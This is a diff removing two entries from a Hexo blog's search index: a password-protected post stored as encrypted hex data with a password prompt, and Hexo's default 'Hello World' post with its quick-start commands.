-  <script id="hbeData" type="hbeData" data-hmacdigest="2ed9a5dab17977ce04a64813e9df7b80ce8fdace4bcfa95a13c1120069eff268">575a118a515358b9225a7b41efbbfd2abcfda8c0009cac2d5f17a2723616e7d7953f6e499284bf047435f59b7ccaafdf85f76543b70de56066d221104a50b3e8d8b2b07c5072ec22a589c4076af73abc4435528c3025c3f28f151617ab7e3d8eb98d4a13675093e2279302a0b3c3b2eef2b382dce221a22ce38ebc8569ba3af3404823bdf7e3b9084b7a04cabaacb2ecabead9e5262e2ca0ca15ea85007162aff0c9d7702585c158112cf81ea2ffaa33dc833f23d12a275fbf52d6d5256a161555e742b4f53bf44055ee5d8f8bf036c598956b13025611cd7f07b20c4329791a6a8b313155a1c7039df899f8d2e4b36c4fdf7c31ab15a4d6647a5f3903a6bc3750a3edd992a7cfe7ef55800f203f263d444d28c1aebeb087a95ae32e8deb7b13710a71f2054fd6090deca6537ac3ad5a92e000aea5045eca7b77254ea43e7dcc2ba774ef6918ff78c8da3526c29484554f7f52e0523ea849c9198c9dcfa80c03390b2c865f8d112b11d589d39d57f405ca3d5620d032b722e39f5233687924de446bec9a1da61aa947c273eb73b9d2ee6d93ff7d0131c5a093ed88a92832fdc4aaeaa32390a996c9a4858ac9abe34dba1ba5df7235e59d96e60c938d11532631045937c2ebbf8b6cda172af8db6b53a5eafe66bc6384e99f6bddbf68b7f0291eda1ccb8cf11ab9ac04a9ac928825e05d9f3689d82cd8cfd7873082ab99f51036401f4eb36c95996288a53453c9bf4da9d55eceb01a1e186293d521242e326026a04f8270b5de0506540adb70a1d1afde709142e93bbbb1b649854800aa973507a293eb7d9e7b3feaae1c81b675738ac7e27675e0c337de2728936b937e2c4a5885ce90aae285fdef632affad9500fdbc6de27d012425baf7c3d8ae7b47d3b963d558df85540f170c4d4f3b27ffff24effdc0abd76d35baa6f80d830c5e9e6d97ae7da9c68a83c0fcc243a548e900b6fe3c0b1f884788914090330d8aba28c51a7d8f2c387a3281809bf414da4e312cf2e13ff8767e66da9815baa4c1dbd5d8734c2e12a28e12e3b107638a1459820926ad61ac0551f48905d04524f8e6181bebd57e0c562b9bcd5daf24ebf7c57562793494e76d7e1f1ac7700a511e3381f708891fa2c18635b336f621b4f4640f85d67f45e788288d8ba8c65ead2743f8aed0edca76d072d66577b10a857c8023e2e9cade8bc4aece3cc2797d3fa99db43ec7de475785ac73c6c9fa6868cb7ede5d73f90e2eb19a9394a2b7b5720169550c06215d506d2d3668825b4f8e1278f2851ea56c5d8f5b3196ebe7823f495d4bac917dbd888ce195c2db3166ce435b84b2a44812beaea4ba695e6480ce852a02832c0b211788eb5610ddfdb3f488136638aa11989ef1b40a5e087c4debb1554b3c475b2bc00058b5a732cef8f2f33f5a92f72c20f63672d2e7f35e3a6b04c34bfa24dab3c4429e228735e3427af464a6bff2a257c5ca51be457b4bf78147bbe61a327f9a566a48322767f87c4b34fc7776fdc5a5d7060066cfcd3f0d59b3d73044b8aaff19ccd1ee41f28c72dde5f65df57f4e3bec8b475eef7211d400dbb404d97c709d0e6f2293f5995841dca0dc4f48af6c24e9f5898db00c65f29cdc48755b02b7a170830896de3648cc6592d6381758aba03442d9dedb6ccc17ff45a67796875fa6cd4ed000eebe149ed5f9d215f3a1b59c6b4fef7231ac7059f2da92074c1a89662f2e50d5964bd0a0859a49caa0ff54ed872640df279cf49b4012bbec238170132bf2f991950fa24d49aa6f4d84cc51da027fd7938feed99a58ba754115c4f8fea847ebcc0a1a67ae0c8c2a1bf0121cc807d70ec38ccc8e9413b4a2d0f5f43833f09a6c27f8c0b49e335b6909593b75c8d04abb6008cec34ec87e294c1d17b2aa4109bad0d1ff2e3cb3e8eb7c11c2954801faa3fe020d81b889ff21a536abe825f51f9ea84ad3af73424f835945d2469c82caa90347cffd16c5ea61bee1bbb509fd2ed2e1f9e21be852bb194d517705ba79bbc42f71679153d43e5570d42066d51c98ebb9e5808a7c8b4727cf5dfdb42e0c391aacc5d2952456680197765e7894eea91266d49c5dd2af98f5e943e8b5f30c9a8be93b325d2a8a42bccdcea86ed3748b6e87b879ea6cb8e01e4406e65aa85b986d6f5a5cdcebb63ef257203f97984c63fe25e0c82a326d164972c2fd74336a41e28c536aac36804c72a45ee97b5bd6f9bc906c31cfb104f0572f8b4369a1997d8297e6038541f8e288f544f346ae527c19c4239f940835b15bf7369e02679fd1a4517d7e4b8b498717e4b42f</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <tags>
-        <tag>private</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/posts/4a17b156/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start">Quick Start</h2>
-<h3 id="Create-a-new-post">Create a new post</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server">Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files">Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
   </entry>
 </search>
